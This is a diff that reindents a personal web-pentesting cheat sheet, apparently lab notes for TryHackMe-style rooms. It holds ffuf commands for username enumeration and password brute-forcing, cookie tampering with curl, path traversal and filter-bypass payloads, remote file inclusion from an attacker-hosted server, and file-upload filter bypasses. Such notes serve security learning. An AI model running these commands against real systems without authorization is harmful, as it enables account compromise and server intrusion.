@@ -118,24 +118,24 @@ Gobuster (most of these options apply to `dir` mode)
 
 
 Username Enumeration
-	- enter a username and fill out other fields with fake info to see if "that username already exists" is returned
-	- `ffuf -w [wordlist] -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u [URL] -mr "username already exists"`
-		- `x` specifies request method
-		- `d` specifies data that we send, such as username, email, and password
-		- `H` is for adding additional headers
-		- `mr` is text on the page that we're looking for
+- enter a username and fill out other fields with fake info to see if "that username already exists" is returned
+- `ffuf -w [wordlist] -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u [URL] -mr "username already exists"`
+	- `x` specifies request method
+	- `d` specifies data that we send, such as username, email, and password
+	- `H` is for adding additional headers
+	- `mr` is text on the page that we're looking for
 
 Brute Force Password
-	- use a .txt file of enumerated usernames
-	- `-ffuf -w valid_usernames.txt:W1,[wordlist for passwords]:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u [URL] -fc 200`
-	- https://github.com/digininja/CeWL - Custom wordlist based on website pages
+- use a .txt file of enumerated usernames
+- `-ffuf -w valid_usernames.txt:W1,[wordlist for passwords]:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u [URL] -fc 200`
+-  https://github.com/digininja/CeWL - Custom wordlist based on website pages
 
 Logic Flaw
-	- try different capitalizations if something like an /admin page is not allowed (try /aDMin). This is because the code might be searching for a specific string, but the URL will change the capitalization
+- try different capitalizations if something like an /admin page is not allowed (try /aDMin). This is because the code might be searching for a specific string, but the URL will change the capitalization
 
 Cookies
-	- sometimes cookies are in plain text and can be altered (set-cookie: admin=false)
-	- `curl -H "Cookie: logged_in=true; admin=true" [URL]` to edit a url request
+- sometimes cookies are in plain text and can be altered (set-cookie: admin=false)
+- `curl -H "Cookie: logged_in=true; admin=true" [URL]` to edit a url request
 
 ## XSS
 
@@ -171,10 +171,10 @@ Look here to insert the payload:
 Attacker tricks the server into making an additional request other than the one being made to access the webpage.
 
 Search for opportunities:
-	- URL's that have another URL in their parameter
-	- Hidden field form in the source code that references a URL
-	- Partial URL such as just a hostname
-	- Path of a URL after the domain name `=/forms/contact`
+- URL's that have another URL in their parameter
+- Hidden field form in the source code that references a URL
+- Partial URL such as just a hostname
+- Path of a URL after the domain name `=/forms/contact`
 
 
 ## Server Side Template Injection (SSTI)
@@ -189,21 +189,21 @@ https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
 ## File Inclusion
 
 Path Traversal
-	- vulnerability that allows attacker to read system resources
-	- Try something like `/get.php?file=../../` etc.
-	- or `/?file=../../../` etc
+- vulnerability that allows attacker to read system resources
+- Try something like `/get.php?file=../../` etc.
+- or `/?file=../../../` etc
 
 File Inclusion
-	- When web apps are designed to pull files from directories, we may be able to exploit this
-	- try `?file=`
-	- if input is sanitizing `../` try `....//....//` because it won't do a second pass
-	- if it requires the intended directory to be in the payload, simply start there `/profile` and add the `../`
+- When web apps are designed to pull files from directories, we may be able to exploit this
+- try `?file=`
+- if input is sanitizing `../` try `....//....//` because it won't do a second pass
+- if it requires the intended directory to be in the payload, simply start there `/profile` and add the `../`
 
 Remote File Inclusion
-	- payloads have external endpoints
-	- inject malicious files by connecting to a server hosted by the attacker
-	- URL injection `http://webapp.thm/index.php?lang=[malicious URL]`
-	- give it the URL of your python server or something
+- payloads have external endpoints
+- inject malicious files by connecting to a server hosted by the attacker
+- URL injection `http://webapp.thm/index.php?lang=[malicious URL]`
+- give it the URL of your python server or something
 
 
 ## File Upload
@@ -213,35 +213,35 @@ Filter types:
 - Server side (application, firewall filter)
 
 Client-Side
-	- turn off javascript in your browser
-	- intercept with burp and edit js scripts
-		- `if (file.type!= "image/jpeg) {upload.value = ""}` or something
-		- Intercept the request and then right-click to select "response to this request"
-		- Break the HTML script tag
-		- For external js scripts that the page loads, use "options" in burp, "intercept client request", `^js$|`
-	-intercept and modify the file upload
-		- change payload extension to allowed file type
-		- change MIME type in request to `text/x-php` or whatever
-		- edit back to actual payload file type before forwarding
+-  turn off javascript in your browser
+- intercept with burp and edit js scripts
+	- `if (file.type!= "image/jpeg) {upload.value = ""}` or something
+	- Intercept the request and then right-click to select "response to this request"
+	- Break the HTML script tag
+	- For external js scripts that the page loads, use "options" in burp, "intercept client request", `^js$|`
+- intercept and modify the file upload
+	- change payload extension to allowed file type
+	- change MIME type in request to `text/x-php` or whatever
+	- edit back to actual payload file type before forwarding
 	- Intercept an innocent file upload to enumerate what is going on
 
 Server-side
-	- Magic numbers
-		- [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
-		- `file` checks file type of shell
-		- find bytes for permissible filte type, open file and add them to the top (above code)
-		- reopen file with `hexeditor` and change the bytes
-		- use `file` again to double check
+- Magic numbers
+	- [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
+	- `file` checks file type of shell
+	- find bytes for permissible filte type, open file and add them to the top (above code)
+	- reopen file with `hexeditor` and change the bytes
+	- use `file` again to double check
 
 Upload to file shares and directories
 
 Find a file through enumerating and overwrite it with a payload that has the same name
 
 Blackbox environment
-	- upload a test file and try to see where it goes
-	- use `gobuster -x` to try and find file
-	- look at source code
-	- intercept requests
+- upload a test file and try to see where it goes
+- use `gobuster -x` to try and find file
+- look at source code
+- intercept requests
 - if server-side filter:
 	- upload file with invalid (made up) file extensions to check for white list/black list
 		- if upload is successful, blacklist
